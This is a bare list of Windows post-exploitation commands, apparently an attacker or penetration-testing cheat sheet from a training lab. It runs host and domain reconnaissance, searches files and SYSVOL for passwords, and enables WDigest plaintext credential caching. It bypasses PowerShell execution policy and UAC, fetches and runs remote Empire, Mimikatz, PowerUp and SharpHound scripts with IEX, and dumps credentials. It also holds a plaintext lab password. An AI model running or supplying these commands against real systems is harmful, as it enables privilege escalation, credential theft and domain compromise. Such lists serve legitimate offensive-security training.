systeminfo
hostname 
wmic qfe get Caption,Description,HotFixID,InstalledOn
net users
net localgroups
net localgroup Administrators
net user itadmin
net user itadmin /domain
net group Administrators /domain
ipconfig /all
route print
arp -A
whoami /priv
findstr /spin "password" *.*
tasklist /SVC
netstat -ano
reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1
findstr /S cpassword $env:logonserver\sysvol\*.xml
findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)
runas /user:LABS\itadmin /password:APTClass! /noprofile powershell.exe
powershell -ep bypass
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1')
Invoke-BypassUAC -Command 'start powershell.exe'
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’)
Invoke-AllChecks
IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1')
Invoke-BloodHound

